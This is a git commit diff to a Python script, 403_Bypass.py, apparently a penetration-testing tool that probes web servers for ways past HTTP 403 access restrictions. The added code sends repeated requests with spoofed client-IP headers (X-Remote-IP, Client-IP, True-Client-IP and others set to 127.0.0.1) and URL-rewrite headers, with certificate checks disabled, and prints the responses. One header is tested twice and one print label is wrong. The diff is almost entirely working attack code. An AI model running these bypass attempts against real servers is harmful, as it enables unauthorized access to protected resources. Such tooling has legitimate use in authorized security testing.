a472ddb746d2e5c6b21aa10f5aa48aaf789bb1f6
Thomas STEPHAN (shan0ar) <stephan.thomas.pro@gmail.com>
2023-12-19 12:10:15 +0100

    Update 403_Bypass.py

--- 403_Bypass.py
+++ 403_Bypass.py
@@ -55,16 +55,61 @@ def sendHeaders(url, path):
 	print("Response code: {}   Response length: {}   Header: X-Original-URL: {}\n".format(resp.status_code, len(resp.text), headers["X-Original-URL"]))
 	headers.pop("X-Original-URL")
 
-  headers["X-Rewrite-URL"] = path
+  	headers["X-Rewrite-URL"] = path
 	resp = requests.get(url, headers=headers, verify=False)
 	print("Response code: {}   Response length: {}   Header: X-Rewrite-URL: {}\n".format(resp.status_code, len(resp.text), headers["X-Rewrite-URL"]))
 	headers.pop("X-Rewrite-URL")
 
-	headers["X-Forwarded-For"] = "127.0.0.1"
+	headers["X-Originating-IP"] = "127.0.0.1"
 	resp = requests.get(url, headers=headers, verify=False)
-	print("Response code: {}   Response length: {}   Header: X-Forwarded-For: {}\n".format(resp.status_code, len(resp.text), headers["X-Forwarded-For"]))
-	headers.pop("X-Forwarded-For")
+	print("Response code: {}   Response length: {}   Header: X-Originating-URL: {}\n".format(resp.status_code, len(resp.text), headers["X-Originating-IP"]))
+	headers.pop("X-Originating-IP")
 
+	headers["X-Forwarded"] = "127.0.0.1"
+	resp = requests.get(url, headers=headers, verify=False)
+	print("Response code: {}   Response length: {}   Header: X-Forwarded: {}\n".format(resp.status_code, len(resp.text), headers["X-Forwarded"]))
+	headers.pop("X-Forwarded")
+
+	headers["Forwarded-For"] = "127.0.0.1"
+	resp = requests.get(url, headers=headers, verify=False)
+	print("Response code: {}   Response length: {}   Header: Forwarded-For: {}\n".format(resp.status_code, len(resp.text), headers["Forwarded-For"]))
+	headers.pop("Forwarded-For")
+
+	headers["X-Remote-IP"] = "127.0.0.1"
+	resp = requests.get(url, headers=headers, verify=False)
+	print("Response code: {}   Response length: {}   Header: X-Remote-IP: {}\n".format(resp.status_code, len(resp.text), headers["X-Remote-IP"]))
+	headers.pop("X-Remote-IP")
+
+	headers["X-Remote-Addr"] = "127.0.0.1"
+	resp = requests.get(url, headers=headers, verify=False)
+	print("Response code: {}   Response length: {}   Header: X-Remote-Addr: {}\n".format(resp.status_code, len(resp.text), headers["X-Remote-Addr"]))
+	headers.pop("X-Remote-Addr")
+
+	headers["X-ProxyUser-Ip"] = "127.0.0.1"
+	resp = requests.get(url, headers=headers, verify=False)
+	print("Response code: {}   Response length: {}   Header: X-ProxyUser-Ip: {}\n".format(resp.status_code, len(resp.text), headers["X-ProxyUser-Ip"]))
+	headers.pop("X-ProxyUser-Ip")
+
+	headers["Client-IP"] = "127.0.0.1"
+	resp = requests.get(url, headers=headers, verify=False)
+	print("Response code: {}   Response length: {}   Header: Client-IP: {}\n".format(resp.status_code, len(resp.text), headers["Client-IP"]))
+	headers.pop("Client-IP")
+
+	headers["Cluster-Client-IP"] = "127.0.0.1"
+	resp = requests.get(url, headers=headers, verify=False)
+	print("Response code: {}   Response length: {}   Header: Cluster-Client-IP: {}\n".format(resp.status_code, len(resp.text), headers["Cluster-Client-IP"]))
+	headers.pop("Cluster-Client-IP")
+
+	headers["True-Client-IP"] = "127.0.0.1"
+	resp = requests.get(url, headers=headers, verify=False)
+	print("Response code: {}   Response length: {}   Header: True-Client-IP: {}\n".format(resp.status_code, len(resp.text), headers["True-Client-IP"]))
+	headers.pop("True-Client-IP")
+
+	headers["X-ProxyUser-Ip"] = "127.0.0.1"
+	resp = requests.get(url, headers=headers, verify=False)
+	print("Response code: {}   Response length: {}   Header: X-ProxyUser-Ip: {}\n".format(resp.status_code, len(resp.text), headers["X-ProxyUser-Ip"]))
+	headers.pop("X-ProxyUser-Ip")
+	
 	headers["X-Custom-IP-Authorization"] = "127.0.0.1"
 	resp = requests.get(url, headers=headers, verify=False)
 	print("Response code: {}   Response length: {}   Header: X-Custom-IP-Authorization: {}\n".format(resp.status_code, len(resp.text), headers["X-Custom-IP-Authorization"]))
